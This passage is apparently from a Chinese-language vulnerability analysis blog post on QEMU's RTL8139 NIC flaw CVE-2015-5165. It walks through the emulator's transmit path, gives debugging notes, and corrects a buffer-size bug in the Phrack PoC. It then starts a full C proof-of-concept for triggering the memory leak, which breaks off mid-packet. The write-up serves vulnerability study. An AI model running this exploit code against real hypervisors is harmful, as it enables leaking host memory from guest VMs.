class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_io_writeb</span><span class="params">(<span class="keyword">void</span> *opaque, <span class="keyword">uint8_t</span> addr, <span class="keyword">uint32_t</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RTL8139State *s = opaque;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MAC0 ... MAC0+<span class="number">4</span>:</span><br><span class="line">            s-&gt;phys[addr - MAC0] = val;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">        <span class="keyword">case</span> TxPoll:</span><br><span class="line">            DPRINTF(<span class="string">"C+ TxPoll write(b) val=0x%02x\n"</span>, val);</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">7</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll high priority transmission (not "</span></span><br><span class="line">                    <span class="string">"implemented)\n"</span>);</span><br><span class="line">                <span class="comment">//rtl8139_cplus_transmit(s);</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (val &amp; (<span class="number">1</span> &lt;&lt; <span class="number">6</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                DPRINTF(<span class="string">"C+ TxPoll normal priority transmission\n"</span>);</span><br><span class="line">                rtl8139_cplus_transmit(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ......</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当往 <code>TxPoll</code> 写入数据时，可以触发 <code>C+ TxPoll normal priority transmission</code> ，即调用函数 <code>rtl8139_cplus_transmit</code> ，定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rtl8139_cplus_transmit</span><span class="params">(RTL8139State *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> txcount = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (rtl8139_cplus_transmit_one(s))</span><br><span class="line">    &#123;</span><br><span class="line">        ++txcount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark transfer completed */</span></span><br><span class="line">    <span class="keyword">if</span> (!txcount)</span><br><span class="line">    &#123;</span><br><span class="line">        DPRINTF(<span class="string">"C+ mode : transmitter queue stalled, current TxDesc = %d\n"</span>,</span><br><span class="line">            s-&gt;currCPlusTxDesc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* update interrupt status */</span></span><br><span class="line">        s-&gt;IntrStatus |= TxOK;</span><br><span class="line">        rtl8139_update_irq(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数会循环调用 <code>rtl8139_cplus_transmit_one</code> ，也就是存在漏洞的函数！</p><h3 id="4-4-漏洞触发"><a href="#4-4-漏洞触发" class="headerlink" title="4.4 漏洞触发"></a>4.4 漏洞触发</h3><p>弄清楚漏洞的原理之后，编写 PoC 就比较简单了！对 Linux 和硬件接触不多的初学者（比如笔者自己），建议尝试理解每一行代码的作用，遇到不懂的概念就 Google 一下，代码不 Work 就 Debug 一下，在这个过程中可以学到很多新的知识，这也正是分析该漏洞的出发点。</p><p>在主机中可以通过 GDB 附加到 QEMU 进程 <code>qemu-system-x86</code> 进行调试，触发漏洞的位置如下：</p><p><img src="/uploads/202006/qemu-gdb-debug.png" alt="GDB 调试 QEMU 漏洞 CVE-2015-5165"></p><p><strong>调试过程中遇到的几个坑：</strong></p><p><strong>(I)</strong> 在构造数据包时，Ethernet Frame 的源 MAC 地址、目标 MAC 地址需要填充为 QEMU 虚拟机 RTL8139 网卡的 MAC 地址，通过 <code>ifconfig -a</code> 命令可以查看本机所有网卡的数据；笔者一开始使用的 <code>ifconfig</code> 命令，结果偏偏没有打印 RTL8139 网卡的信息，导致填充了错误的 MAC 地址，通过调试 QEMU 进程才发现 MAC 地址不一致；</p><p><strong>(II)</strong> Phrack 文章 [1] 提供的 Exploit 代码中 <code>rtl8139_tx_desc</code> 是栈上的局部变量，实际测试时发现获取不到在内存中的物理地址（Guest Physical Address），改为从堆上动态申请内存即可；调试发现是笔者自己实现的获取物理内存地址的代码有问题，因为栈的地址很高，转换成有符号数是一个负数，所以在调用 <code>fseek</code> 的时候需要处理好符号问题，否则 <code>fseek</code> 会失败；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!fseek(fp, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)addr / PAGE_SIZE * <span class="number">8</span>, SEEK_SET)) </span><br><span class="line">&#123;</span><br><span class="line">    fread(&amp;pfn, <span class="keyword">sizeof</span>(pfn), <span class="number">1</span>, fp);</span><br><span class="line">    <span class="keyword">if</span> (pfn &amp; PFN_PRESENT) </span><br><span class="line">    &#123;</span><br><span class="line">        pfn &amp;= PFN_PFN;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(III)</strong> 在 QEMU 虚拟机测试 PoC 时，发现打印接收到的数据的时候进程 Crash 了，从打印出来的调用栈来看，应该是接收缓冲区溢出了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./a.out</span></span><br><span class="line">*** Error in `./a.out': corrupted size vs. prev_size: 0x092975e8 ***</span><br><span class="line">======= Backtrace: =========</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x67377)[0xb75af377]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6d2f7)[0xb75b52f7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(+0x6f979)[0xb75b7979]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_malloc+0xc5)[0xb75b8fc5]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_doallocate+0x6e)[0xb75a592e]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_doallocbuf+0x47)[0xb75b31c7]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_overflow+0x1c1)[0xb75b2561]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_file_xsputn+0x94)[0xb75b1684]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_vfprintf+0x193)[0xb758a253]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(_IO_printf+0x26)[0xb7591696]</span><br><span class="line">./a.out[0x8048b1e]</span><br><span class="line">./a.out[0x8048c61]</span><br><span class="line">/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf7)[0xb7560637]</span><br><span class="line">./a.out[0x80485b1]</span><br></pre></td></tr></table></figure><p>调试发现 Phrack 文章 [1] 末尾给出的代码存在一个 Bug，而这个 Bug 居然没有人发现，笔者搜索了国内相关的技术文章，发现都照搬了这个 Bug 。其他人没有发现这里的问题，可能是由于分析环境的不同所造成的：</p><ul><li>笔者的 QEMU 虚拟机中安装的是 Ubuntu 官方发行的 Server 版本</li><li>其他文章中的 QEMU 虚拟机中安装的是临时编译的 Linux 系统</li></ul><p>对该 Bug 的分析如下：</p><ol><li>函数 <code>rtl8139_cplus_transmit_one</code> 在发送分片后的 Ethernet Frame 时，数据包的大小是 <code>1514</code> 字节；</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> tcp_chunk_size = ETH_MTU - hlen - tcp_hlen;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">uint16_t</span> chunk_size = tcp_chunk_size;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">int</span> tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size;</span><br><span class="line">rtl8139_transfer_frame(s, saved_buffer, tso_send_size,</span><br><span class="line">    <span class="number">0</span>, (<span class="keyword">uint8_t</span> *) dot1q_buffer);</span><br></pre></td></tr></table></figure><ol start="2"><li>因为是发给本机的数据，所以执行流程经由 <code>rtl8139_transfer_frame</code> 进入 <code>rtl8139_do_receive</code> ，这里会检查接收缓冲区是否还有多余的 <code>4</code> 字节空间用于填充 Checksum ；</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> rx_space = rxdw0 &amp; CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">if</span> (size+<span class="number">4</span> &gt; rx_space)</span><br><span class="line">&#123;</span><br><span class="line">    DPRINTF(<span class="string">"C+ Rx mode : descriptor %d size %d received %d + 4\n"</span>,</span><br><span class="line">        descriptor, rx_space, size);</span><br><span class="line">    <span class="comment">// error handling ......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dma_addr_t</span> rx_addr = rtl8139_addr64(rxbufLO, rxbufHI);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* receive/copy to target memory */</span></span><br><span class="line"><span class="keyword">if</span> (dot1q_buf) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    pci_dma_write(d, rx_addr, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="comment">/* write checksum */</span></span><br><span class="line">val = cpu_to_le32(crc32(<span class="number">0</span>, buf, size_));</span><br><span class="line">pci_dma_write(d, rx_addr+size, (<span class="keyword">uint8_t</span> *)&amp;val, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><ol start="3"><li>Phrack 文章 [1] 对接收缓冲区的设置位于函数 <code>rtl8139_desc_config_rx</code> ，可以每一个 <code>ring / descriptor</code> 关联的缓冲区的大小是 <code>RTL8139_BUFFER_SIZE</code> 即 <code>1514</code> 字节，但是 <code>dw0</code> 标志中设置的大小却是 <code>USHRT_MAX</code> 即 <code>65535</code> ；</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rtl8139_desc_config_rx</span><span class="params">(struct rtl8139_ring *ring,</span></span></span><br><span class="line"><span class="function"><span class="params">                            struct rtl8139_desc *desc, <span class="keyword">int</span> nb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> addr;</span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nb; i++) &#123;</span><br><span class="line">ring[i].desc = &amp;desc[i];</span><br><span class="line"><span class="built_in">memset</span>(ring[i].desc, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct rtl8139_desc));</span><br><span class="line"></span><br><span class="line">ring[i].buffer = aligned_alloc(PAGE_SIZE, RTL8139_BUFFER_SIZE);</span><br><span class="line"><span class="built_in">memset</span>(ring[i].buffer, <span class="number">0</span>, RTL8139_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(ring[i].buffer);</span><br><span class="line"></span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_OWN;</span><br><span class="line"><span class="keyword">if</span> (i == nb - <span class="number">1</span>)</span><br><span class="line">ring[i].desc-&gt;dw0 |= CP_RX_EOR;</span><br><span class="line">ring[i].desc-&gt;dw0 &amp;= ~CP_RX_BUFFER_SIZE_MASK;</span><br><span class="line">ring[i].desc-&gt;dw0 |= USHRT_MAX;</span><br><span class="line">ring[i].desc-&gt;buf_lo = addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">addr = (<span class="keyword">uint32_t</span>)gva_to_gpa(desc);</span><br><span class="line">outl(addr, RTL8139_PORT + RxRingAddrLO);</span><br><span class="line">outl(<span class="number">0x0</span>, RTL8139_PORT + RxRingAddrHI);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>这样的设置显然是不对的，这会导致可以通过函数 <code>rtl8139_do_receive</code> 中的缓冲区大小检查，后面在写入 Checksum 时会导致堆块越界写，这就是导致 QEMU 虚拟机中 PoC 进程 Crash 的原因；</li></ol><p>参考 Phrack 文章的代码，笔者重写的一份用于测试 CVE-2015-5165 的完整 PoC 代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面相关参数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT 12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Ethernet Frame 大小</span></span><br><span class="line"><span class="comment">// DST(6) + SRC(6) + Length/Type(2) + PayloadMTU(1500)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_BUFFER_SIZE 1514</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡 PMIO 地址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RTL8139_PORT 0xc000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Rx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// w0 end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// Rx buffer size mask 表示 0 ~ 12 位为 buffer size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_RX_BUFFER_SIZE_MASK ((1&lt;&lt;13) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tx ownership flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_OWN (1&lt;&lt;31)</span></span><br><span class="line"><span class="comment">// Tx end of ring flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_EOR (1&lt;&lt;30)</span></span><br><span class="line"><span class="comment">// last segment of received packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LS (1&lt;&lt;28)</span></span><br><span class="line"><span class="comment">// large send packet flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_LGSEN (1&lt;&lt;27)</span></span><br><span class="line"><span class="comment">// IP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_IPCS (1&lt;&lt;18)</span></span><br><span class="line"><span class="comment">// TCP checksum offload flag</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CP_TX_TCPCS (1&lt;&lt;16)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 网卡寄存器偏移地址</span></span><br><span class="line"><span class="keyword">enum</span> RTL8139_registers </span><br><span class="line">&#123;</span><br><span class="line">    TxAddr0      = <span class="number">0x20</span>,    <span class="comment">// Tx descriptors address</span></span><br><span class="line">    ChipCmd      = <span class="number">0x37</span>,</span><br><span class="line">    TxConfig     = <span class="number">0x40</span>,</span><br><span class="line">    RxConfig     = <span class="number">0x44</span>,</span><br><span class="line">    TxPoll       = <span class="number">0xD9</span>,    <span class="comment">// tell chip to check Tx descriptors for work</span></span><br><span class="line">    CpCmd        = <span class="number">0xE0</span>,    <span class="comment">// C+ Command register (C+ mode only)</span></span><br><span class="line">    <span class="comment">// 虽然名字写的 RxRingAddr, 但实际上是 Rx descriptor 的地址</span></span><br><span class="line">    RxRingAddrLO = <span class="number">0xE4</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">    RxRingAddrHI = <span class="number">0xE8</span>,    <span class="comment">// 64-bit start addr of Rx descriptor</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_tx_config_bits </span><br><span class="line">&#123;</span><br><span class="line">    TxLoopBack = (<span class="number">1</span> &lt;&lt; <span class="number">18</span>) | (<span class="number">1</span> &lt;&lt; <span class="number">17</span>), <span class="comment">// enable loopback test mode</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_rx_mode_bits </span><br><span class="line">&#123;</span><br><span class="line">    AcceptErr       = <span class="number">0x20</span>,</span><br><span class="line">    AcceptRunt      = <span class="number">0x10</span>,</span><br><span class="line">    AcceptBroadcast = <span class="number">0x08</span>,</span><br><span class="line">    AcceptMulticast = <span class="number">0x04</span>,</span><br><span class="line">    AcceptMyPhys    = <span class="number">0x02</span>,</span><br><span class="line">    AcceptAllPhys   = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL_8139_CplusCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlusRxVLAN   = <span class="number">0x0040</span>, <span class="comment">/* enable receive VLAN detagging */</span></span><br><span class="line">    CPlusRxChkSum = <span class="number">0x0020</span>, <span class="comment">/* enable receive checksum offloading */</span></span><br><span class="line">    CPlusRxEnb    = <span class="number">0x0002</span>,</span><br><span class="line">    CPlusTxEnb    = <span class="number">0x0001</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RT8139_ChipCmdBits </span><br><span class="line">&#123;</span><br><span class="line">    CmdReset    = <span class="number">0x10</span>,</span><br><span class="line">    CmdRxEnb    = <span class="number">0x08</span>,</span><br><span class="line">    CmdTxEnb    = <span class="number">0x04</span>,</span><br><span class="line">    RxBufEmpty  = <span class="number">0x01</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RTL8139_TxPollBits </span><br><span class="line">&#123;</span><br><span class="line">    CPlus = <span class="number">0x40</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx descriptor</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> dw0;</span><br><span class="line">    <span class="keyword">uint32_t</span> dw1;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_lo;</span><br><span class="line">    <span class="keyword">uint32_t</span> buf_hi;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// RTL8139 Rx / Tx ring</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_ring</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtl8139_desc</span>* <span class="title">desc</span>;</span></span><br><span class="line">    <span class="keyword">void</span>* buffer;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> rtl8139_packet[] = </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Ethernet Frame Header 数据</span></span><br><span class="line">    <span class="comment">// DST MAC 52:54:00:12:34:57</span></span><br><span class="line">    <span class="number">0x52</span>, <span 